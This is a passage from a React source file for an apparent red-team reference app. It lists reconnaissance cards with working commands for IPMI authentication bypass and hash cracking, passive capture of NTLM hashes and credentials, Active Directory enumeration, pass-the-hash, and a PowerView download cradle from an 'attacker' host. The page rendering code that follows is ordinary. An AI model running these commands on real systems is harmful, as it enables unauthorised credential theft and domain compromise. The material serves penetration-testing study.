    overview: 'IPMI (Intelligent Platform Management Interface, UDP 623) provides out-of-band server management. Critical vulnerabilities include: Cipher 0 authentication bypass (authenticate with any password) and the RAKP authentication flaw (server leaks salted MD5/SHA1 password hash before verifying the client). These hashes can be cracked offline to recover plaintext passwords, often for privileged BMC accounts.',
    steps: [
      'Scan UDP 623 to identify IPMI services',
      'Test Cipher 0 bypass: authenticate with empty password using cipher suite 0',
      'Dump IPMI hashes using Metasploit ipmi_dumphashes module',
      'Crack recovered hashes with hashcat',
      'Use recovered credentials to access the BMC management console or pivot to other services',
    ],
    commands: [
      {
        title: 'IPMI enumeration and hash dump',
        code: `# nmap IPMI scan
nmap -sU -p623 --script ipmi-version 10.10.10.5

# ipmitool — Cipher 0 bypass (any password works)
ipmitool -I lanplus -C 0 -H 10.10.10.5 -U admin -P "" user list
# -C 0 = Cipher Suite 0 (no authentication required)

# Metasploit — IPMI hash dump (RAKP vulnerability)
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS 10.10.10.5
run
# Returns: username:hash pairs

# Crack IPMI hashes with hashcat
hashcat -m 7300 ipmi_hashes.txt rockyou.txt
# -m 7300 = IPMI2 RAKP HMAC-SHA1

# Metasploit — Cipher 0 authentication bypass
use auxiliary/scanner/ipmi/ipmi_cipher_zero
set RHOSTS 10.10.10.5
run

# ipmitool — management commands (if access obtained)
ipmitool -I lanplus -H 10.10.10.5 -U admin -P password chassis status
ipmitool -I lanplus -H 10.10.10.5 -U admin -P password user list
ipmitool -I lanplus -H 10.10.10.5 -U admin -P password sol activate`
      }
    ]
  },

  // ── PACKET CAPTURE ──────────────────────────────────────────────────────────
  {
    id: 'wireshark-recon',
    title: 'Wireshark — Passive Network Reconnaissance',
    subtitle: 'Capture and analyze network traffic passively to identify hosts, services, credentials, and lateral movement paths',
    tags: ['Wireshark', 'tshark', 'passive recon', 'NBNS', 'LLMNR', 'Kerberos', 'NTLM', 'SMB'],
    accentColor: 'purple',
    overview: 'Passive network capture on a mirrored port or shared segment reveals the internal network topology, active hosts, domain structure, and cleartext/crackable credentials without transmitting a single packet. NBNS and LLMNR broadcast queries map hostnames to IPs. Kerberos AS-REQ frames expose usernames in plaintext. NTLM Type3 messages contain NTLMv2 hashes crackable offline. HTTP POST bodies contain form credentials.',
    steps: [
      'Place attacker interface in promiscuous mode on a mirrored port or shared network segment',
      'Analyse NBNS/LLMNR broadcasts to passively map hostname-to-IP assignments',
      'Filter Kerberos AS-REQ frames to extract usernames in plaintext (cname field)',
      'Capture NTLM challenge/response exchanges — Type3 messages contain crackable NTLMv2 hashes',
      'Filter HTTP POST requests to extract cleartext credentials from web form submissions',
      'Analyse ARP traffic to build a complete IP-to-MAC inventory without sending any frames',
    ],
    commands: [
      {
        title: 'Wireshark display filters for recon',
        code: `# NBNS/LLMNR — internal hostname discovery (passive)
nbns
llmnr
udp.port == 5355       # LLMNR
udp.port == 137        # NBNS

# ARP — build IP→MAC map
arp

# DHCP — hostname of every device joining
dhcp
bootp.option.hostname

# DNS — all internal service queries
dns
dns.qry.name contains "corp.local"

# Kerberos — extract usernames from AS-REQ
kerberos.msg_type == 10   # AS-REQ (contains username in plaintext)
kerberos.CNameString      # Username field

# NTLM — capture hashes for cracking
ntlmssp                   # All NTLM auth
ntlmssp.auth.username     # Username in Type3

# SMB — OS fingerprinting
smb2
smb2.cmd == 0             # NEGOTIATE (OS version in response)

# HTTP — cleartext credentials
http.request.method == "POST"
http contains "password"`
      },
      {
        title: 'tshark — automated credential extraction',
        code: `# Capture to file
tshark -i eth0 -w /tmp/capture.pcapng

# Extract DNS queries
tshark -r capture.pcapng -Y "dns" -T fields \\
  -e frame.time -e ip.src -e dns.qry.name | sort -u

# Extract Kerberos usernames (no decryption needed)
tshark -r capture.pcapng -Y "kerberos.msg_type == 10" \\
  -T fields -e ip.src -e kerberos.CNameString -e kerberos.realm | sort -u

# Extract NTLMv2 hashes (crack with hashcat -m 5600)
tshark -r capture.pcapng -Y "ntlmssp.auth.ntresponse" \\
  -T fields -e ip.src -e ntlmssp.auth.username \\
  -e ntlmssp.auth.domain -e ntlmssp.auth.ntresponse

# Extract HTTP POST credentials
tshark -r capture.pcapng -Y "http.request.method==POST" \\
  -T fields -e frame.time -e ip.src -e http.host -e http.file_data | head -50

# PCredz — auto-extract credentials from pcap
pip install PCredz
python3 Pcredz -f capture.pcapng
# Outputs NTLMv2 hashes in hashcat format

# Crack extracted hashes
hashcat -m 5600 ntlm_hashes.txt rockyou.txt -r rules/best64.rule`
      }
    ]
  },

  // ── INTERNAL AD RECON ──────────────────────────────────────────────────────
  {
    id: 'domain-recon',
    title: 'Internal Domain Reconnaissance',
    subtitle: 'Enumerate Active Directory users, groups, computers, and trusts after initial access',
    tags: ['PowerView', 'SharpView', 'ADSearch', 'LDAP', 'domain enum', 'BloodHound'],
    accentColor: 'cyan',
    overview: 'Active Directory reconnaissance maps the domain structure, identifies privileged accounts, and surfaces attack paths before any escalation. PowerView runs entirely in memory via IEX download cradle. SharpView (.NET) runs via execute-assembly — no PowerShell process spawned. ADSearch is the lowest-footprint option: a single LDAP query tool with minimal signatures. The goal is to identify kerberoastable service accounts, AS-REP-roastable users, unconstrained delegation hosts, and Domain Admin group membership.',
    steps: [
      'Load PowerView in memory: IEX (New-Object Net.WebClient).DownloadString(\'http://attacker/PowerView.ps1\')',
      'Enumerate domain basics: Get-Domain, Get-DomainController, Get-DomainPolicy',
      'Enumerate users with interesting properties: Get-DomainUser -SPN (Kerberoastable), Get-DomainUser -PreauthNotRequired (AS-REP)',
      'Enumerate Domain Admins and their nested group membership: Get-DomainGroupMember "Domain Admins" -Recurse',
      'Find computers with unconstrained/constrained delegation: Get-DomainComputer -Unconstrained',
      'Find local admin access for current user: Find-LocalAdminAccess -Verbose (noisy — use with caution)',
      'Run SharpView via execute-assembly for the same enumeration without a PowerShell process',
    ],
    commands: [
      {
        title: 'PowerView domain enumeration',
        code: `# Load PowerView in memory
IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerView.ps1')

# Domain information
Get-Domain
Get-DomainController
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess

# User enumeration
Get-DomainUser | select samaccountname, description, pwdlastset, memberof
Get-DomainUser -SPN              # Kerberoastable users
Get-DomainUser -PreauthNotRequired  # AS-REP roastable

# Group enumeration
Get-DomainGroup -Identity "Domain Admins" | select member
Get-DomainGroupMember "Domain Admins" -Recurse

# Computer enumeration
Get-DomainComputer | select dnshostname, operatingsystem
Get-DomainComputer -Unconstrained

# Find local admin access
Find-LocalAdminAccess -Verbose

# GPO enumeration
Get-DomainGPO | select displayname, gpcfilesyspath
Get-DomainGPOLocalGroup`
      },
      {
        title: 'ADSearch — lightweight LDAP',
        code: `# ADSearch — fast LDAP from CS beacon
execute-assembly /path/to/ADSearch.exe --search "objectCategory=user" --attributes samaccountname,description

# Kerberoastable accounts
execute-assembly /path/to/ADSearch.exe --search "(&(objectCategory=user)(servicePrincipalName=*))" --attributes samaccountname,serviceprincipalname

# AS-REP roastable
execute-assembly /path/to/ADSearch.exe --search "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" --attributes samaccountname

# Domain Admins
execute-assembly /path/to/ADSearch.exe --search "(&(objectCategory=group)(cn=Domain Admins))" --attributes member

# Unconstrained delegation hosts
execute-assembly /path/to/ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes dnshostname`
      },
      {
        title: 'PowerShell AD Module — LDAP filters',
        code: `Import-Module ActiveDirectory

# Kerberoastable accounts (SPN + user objects)
Get-ADUser -LDAPFilter "(&(objectCategory=user)(servicePrincipalName=*))" \`
  -Properties servicePrincipalName | Select Name,servicePrincipalName

# AS-REP roastable (pre-auth NOT required — UAC flag 4194304)
Get-ADUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"

# Password never expires (UAC flag 65536)
Get-ADUser -LDAPFilter "(userAccountControl:1.2.840.113556.1.4.803:=65536)"

# AdminCount=1 — previously in a protected group
Get-ADUser -LDAPFilter "(adminCount=1)" | Select Name,samAccountName

# Unconstrained delegation hosts (excluding DCs)
Get-ADComputer -LDAPFilter "(&(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(userAccountControl:1.2.840.113556.1.4.803:=8192)))" \`
  -Properties dnshostname | Select Name,dnshostname

# Constrained delegation
Get-ADComputer -LDAPFilter "(msDS-AllowedToDelegateTo=*)" \`
  -Properties msDS-AllowedToDelegateTo | Select Name,@{N='Delegates';E={$_.'msDS-AllowedToDelegateTo'}}

# Users with description containing 'pass'
Get-ADUser -LDAPFilter "(|(description=*pass*)(description=*cred*)(description=*pwd*))" \`
  -Properties description | Select Name,description`
      }
    ]
  },
  {
    id: 'bloodhound',
    title: 'BloodHound — Attack Path Analysis',
    subtitle: 'Graph-based AD attack path discovery using SharpHound data collection',
    tags: ['BloodHound', 'SharpHound', 'ACLs', 'attack paths', 'graph', 'Cypher', 'DCOnly'],
    accentColor: 'cyan',
    overview: 'BloodHound ingests Active Directory relationship data collected by SharpHound and renders it as a graph database (Neo4j). It reveals non-obvious attack paths — a sequence of ACL abuses, group memberships, and delegation configurations that a user can chain to reach Domain Admin. The "Shortest Path to Domain Admins" query alone identifies most engagement-critical escalation routes.',
    steps: [
      'Run SharpHound via execute-assembly: execute-assembly /tools/SharpHound.exe --CollectionMethods All',
      'For stealth: use DCOnly collection to query only the DC: --CollectionMethods DCOnly',
      'Download the output ZIP and import to BloodHound GUI: Upload Data → select ZIP',
      'Run "Find Shortest Paths to Domain Admins" and "Find Principals with DCSync Rights"',
      'Mark compromised accounts as Owned — BloodHound shows paths from owned nodes',
      'Write custom Cypher queries for specific questions',
    ],
    commands: [
      {
        title: 'SharpHound collection and BloodHound queries',
        code: `# SharpHound data collection
execute-assembly /path/to/SharpHound.exe --CollectionMethods All
execute-assembly /path/to/SharpHound.exe --CollectionMethods DCOnly   # Stealthy
execute-assembly /path/to/SharpHound.exe --CollectionMethods Session,LoggedOn

# Sliver equivalent
sliver (session) > execute-assembly --in-process /tools/SharpHound.exe --CollectionMethods All

# Download ZIP
download C:\\Users\\Public\\20250101_BloodHound.zip

# Import: GUI → Upload Data → Select ZIP

# Built-in queries:
# - Find Shortest Path to Domain Admins
# - Find Principals with DCSync Rights
# - Find Computers with Unsupported Operating Systems
# - Shortest Paths from Kerberoastable Users

# Custom Cypher — users with GenericAll on Domain Admins
MATCH (u:User)-[:GenericAll]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}) RETURN u.name

# All paths from owned user to DA
MATCH p=shortestPath((u:User {name:"USER@CORP.LOCAL"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

# Mark node as owned (right-click → Mark as Owned)`
      },
      {
        title: 'BloodHound enumeration with netexec (nxc) / crackmapexec',
        code: `# ── netexec (nxc) — BloodHound collection over SMB ──
# Requires valid domain credentials
nxc smb DC01.corp.local -u user -p 'Password1' --bloodhound --collection All
nxc smb DC01.corp.local -u user -p 'Password1' --bloodhound --collection DCOnly   # Stealth
nxc smb 10.10.10.0/24   -u user -p 'Password1' --bloodhound --collection Session,LoggedOn

# Output: automatically saves ZIP to current directory
# Import the ZIP into BloodHound GUI as usual

# ── crackmapexec (legacy / cme) ──
crackmapexec smb DC01.corp.local -u user -p 'Password1' --bloodhound --collection All
crackmapexec smb DC01.corp.local -u user -p 'Password1' --bloodhound --collection DCOnly

# ── Using NTLM hash instead of password ──
nxc smb DC01.corp.local -u user -H aad3b435b51404eeaad3b435b51404ee:NTLMHASH --bloodhound --collection All

# ── Kerberos auth (pass-the-ticket) ──
nxc smb DC01.corp.local -u user -p 'Password1' -k --bloodhound --collection All

# ── Enumerate specific session/logged-on users (noisy but useful) ──
nxc smb 10.10.10.0/24 -u user -p 'Password1' --bloodhound --collection Session
nxc smb 10.10.10.0/24 -u user -p 'Password1' --sessions     # Active sessions
nxc smb 10.10.10.0/24 -u user -p 'Password1' --loggedon-users  # Logged-on users

# ── BloodHound CE (Community Edition) — REST API import ──
# nxc outputs compatible ZIP — import directly to BH CE API or GUI`
      }
    ]
  },
];

export default function Reconnaissance() {
  const { columns, setColumns, allCards, addCustomCard, updateCard, deleteCard, reorderCards } = usePageStorage('reconnaissance', initialMapColumns, techniques);
  const [modalStep, setModalStep] = useState(null);
  const [columnName, setColumnName] = useState('');
  const [selectedColor, setSelectedColor] = useState('cyan');
  const [addingTopicCol, setAddingTopicCol] = useState(null);
  const [topicTitle, setTopicTitle] = useState('');
  const [topicTags, setTopicTags] = useState('');
  const [cardModalOpen, setCardModalOpen] = useState(false);
  const [editingCard, setEditingCard] = useState(null);
  const handleCardSubmit = (card) => { if (editingCard) { updateCard(card); setEditingCard(null); } else addCustomCard(card); };

  const colorOptions = [
    { value: 'cyan', name: 'Cyan' }, { value: 'green', name: 'Green' }, { value: 'red', name: 'Red' }, { value: 'purple', name: 'Purple' },
    { value: 'orange', name: 'Orange' }, { value: 'pink', name: 'Pink' }, { value: 'blue', name: 'Blue' }, { value: 'yellow', name: 'Yellow' },
  ];
  const colorPreview = { cyan: 'bg-cyan-500', green: 'bg-emerald-500', red: 'bg-red-500', purple: 'bg-purple-500', orange: 'bg-orange-500', pink: 'bg-pink-500', blue: 'bg-blue-500', yellow: 'bg-yellow-500' };
  const headerColorMap = { cyan: 'text-cyan-400 border-cyan-500/30', green: 'text-emerald-400 border-emerald-500/30', red: 'text-red-400 border-red-500/30', purple: 'text-purple-400 border-purple-500/30', orange: 'text-orange-400 border-orange-500/30', pink: 'text-pink-400 border-pink-500/30', blue: 'text-blue-400 border-blue-500/30', yellow: 'text-yellow-400 border-yellow-500/30' };

  const handleAddColumnStart = () => setModalStep('name');
  const handleNameSubmit = () => { if (columnName.trim()) setModalStep('color'); };
  const handleColorSubmit = () => { setColumns([...columns, { header: columnName.toUpperCase(), color: selectedColor, nodes: [] }]); setModalStep(null); setSelectedColor('cyan'); setColumnName(''); };
  const handleDeleteColumn = (index) => setColumns(columns.filter((_, i) => i !== index));
  const handleAddTopic = (colIndex) => {
    if (topicTitle.trim()) {
      const updated = [...columns];
      updated[colIndex].nodes.push({ title: topicTitle, subtitle: 'Add details here', tags: topicTags.split(',').map(t => t.trim()).filter(t => t) });
      setColumns(updated); setAddingTopicCol(null); setTopicTitle(''); setTopicTags('');
    }
  };
  const handleDeleteTopic = (colIndex, nodeIndex) => { const updated = [...columns]; updated[colIndex].nodes.splice(nodeIndex, 1); setColumns(updated); };
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">External & Internal </span><span className="text-emerald-400">Reconnaissance</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">OSINT • DNS • Dorks • Social Media • Scanning • Packet Capture • Domain Recon • BloodHound</p>
      </div>
      
      <div className="overflow-x-auto pb-4">
        <div className="inline-flex gap-4 min-w-max">
          {columns.map((col, i) => {
            const color = col.color || 'cyan';
            const hColors = headerColorMap[color];
            return (
              <div key={i} className="flex flex-col gap-2 min-w-[180px] max-w-[200px] relative">
                <div className={`text-center py-2 border-b-2 mb-2 ${hColors} flex items-center justify-between px-2`}>
                  <span className="font-mono text-[11px] font-bold tracking-[0.2em] uppercase flex-1">
                    {col.header}
                  </span>
                  <button
                    onClick={() => handleDeleteColumn(i)}
                    className="text-slate-500 hover:text-slate-300 transition-colors p-0.5"
                    title="Delete column"
                  >
                    <X className="w-3 h-3" />
                  </button>
                </div>
                <div className="flex flex-col gap-2 border border-slate-800/50 rounded-lg p-2 bg-[#0d1117]">
                  {col.nodes.map((node, j) => (
                    <div key={j} className="flex items-start gap-1 group">
                      <div className="flex-1 min-w-0">
                        <MapNode
                          title={node.title}
                          subtitle={node.tags && node.tags.length > 0 ? node.tags.join(' • ') : node.subtitle}
                          accentColor={color}
                          small
                        />
                      </div>
                      <button
                        onClick={() => handleDeleteTopic(i, j)}
                        className="text-slate-600 hover:text-red-400 transition-colors p-0.5 flex-shrink-0 opacity-0 group-hover:opacity-100"
                        title="Delete topic"
                      >
                        <X className="w-3 h-3" />
                      </button>
                    </div>
                  ))}
                  
                  {addingTopicCol === i ? (
                    <div className="flex flex-col gap-1">
                      <input
                        type="text"
                        value={topicTitle}
                        onChange={(e) => setTopicTitle(e.target.value)}
                        placeholder="Topic name"
                        className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500"
                        autoFocus
                        onKeyDown={(e) => {
                          if (e.key === 'Escape') {
                            setAddingTopicCol(null);
                            setTopicTitle('');
                            setTopicTags('');
                          }
                        }}
                      />
                      <input
                        type="text"
                        value={topicTags}
                        onChange={(e) => setTopicTags(e.target.value)}
                        placeholder="Tags (comma-separated)"
                        className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500"
                        onKeyDown={(e) => {
                          if (e.key === 'Enter') handleAddTopic(i);
                          if (e.key === 'Escape') {
                            setAddingTopicCol(null);
                            setTopicTitle('');
                            setTopicTags('');
                          }
                        }}
                      />
                      <div className="flex gap-1">
                        <button
                          onClick={() => handleAddTopic(i)}
                          className="flex-1 px-2 py-1 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-mono rounded transition-colors"
                        >
                          Add
                        </button>
                        <button
                          onClick={() => {
                            setAddingTopicCol(null);
                            setTopicTitle('');
                            setTopicTags('');
                          }}
                          className="flex-1 px-2 py-1 bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs font-mono rounded transition-colors"
                        >
                          Cancel
                        </button>
                      </div>
                    </div>
                  ) : (
                    <button
                      onClick={() => setAddingTopicCol(i)}
                      className="px-2 py-1 text-xs font-mono text-slate-500 hover:text-slate-300 border border-dashed border-slate-700 rounded hover:border-slate-500 transition-colors"
                    >
                      + Add Topic
                    </button>
                  )}
                </div>
              </div>
            );
          })}
          
          {/* Add Column Button */}
          <div className="flex flex-col gap-2 min-w-[180px] max-w-[200px]">
            <button
              onClick={handleAddColumnStart}
              className="h-full flex flex-col items-center justify-center gap-2 border-2 border-dashed border-slate-700 rounded-lg p-4 hover:border-slate-500 hover:bg-slate-800/20 transition-all"
            >
              <Plus className="w-6 h-6 text-slate-500" />
              <span className="text-xs font-mono text-slate-500 text-center">Add Column</span>
            </button>
          </div>
        </div>
      </div>

      {/* Modal for Adding Column */}
      {modalStep && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-[#0d1117] border border-slate-800 rounded-lg p-6 max-w-sm w-full mx-4">
            {modalStep === 'name' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Column Name</h3>
                <input
                  type="text"
                  value={columnName}
                  onChange={(e) => setColumnName(e.target.value)}
                  placeholder="e.g., Custom Category"
                  className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-slate-200 placeholder-slate-500 font-mono text-sm focus:outline-none focus:border-slate-500"
                  autoFocus
                  onKeyDown={(e) => e.key === 'Enter' && handleNameSubmit()}
                />
                <div className="flex gap-2">
                  <button
                    onClick={() => setModalStep(null)}
                    className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={handleNameSubmit}
                    className="flex-1 px-4 py-2 bg-emerald-600 text-white rounded-lg hover:bg-emerald-700 transition-colors font-mono text-sm font-semibold"
                  >
                    Next
                  </button>
                </div>
              </div>
            )}

            {modalStep === 'color' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Choose Color</h3>
                <div className="flex flex-col gap-2 max-h-64 overflow-y-auto">
                  {colorOptions.map((option) => (
                    <button
                      key={option.value}
                      onClick={() => setSelectedColor(option.value)}
                      className={`px-4 py-2 rounded-lg text-sm font-mono font-semibold transition-all flex items-center gap-2 ${
                        selectedColor === option.value
                          ? `${colorPreview[option.value]} text-slate-900`
                          : 'bg-slate-800 text-slate-300 hover:bg-slate-700'
                      }`}
                    >
                      <div className={`w-3 h-3 rounded-full ${colorPreview[option.value]}`} />
                      {option.name}
                    </button>
                  ))}
                </div>
                <div className="flex gap-2">
                  <button
                    onClick={() => setModalStep('name')}
                    className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm"
                  >
                    Back
                  </button>
                  <button
                    onClick={handleColorSubmit}
                    className="flex-1 px-4 py-2 bg-emerald-600 text-white rounded-lg hover:bg-emerald-700 transition-colors font-mono text-sm font-semibold"
                  >
                    Create
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}

      <div className="flex items-center justify-between pt-4">
        <button onClick={() => setCardModalOpen(true)} className="px-3 py-1.5 bg-emerald-600 hover:bg-emerald-700 text-white text-xs font-mono rounded transition-colors flex items-center gap-1">
          <Plus className="w-3 h-3" /> Add Technique
        </button>
      </div>
      <AddCardModal isOpen={cardModalOpen || !!editingCard} onClose={() => { setCardModalOpen(false); setEditingCard(null); }} onSubmit={handleCardSubmit} editCard={editingCard} />
      <div className="border-t border-slate-800/50 pt-10">
        <DraggableCardList cards={allCards} onDelete={deleteCard} onReorder={reorderCards} onEdit={(card) => setEditingCard(card)} />
      </div>
    </div>
  );
}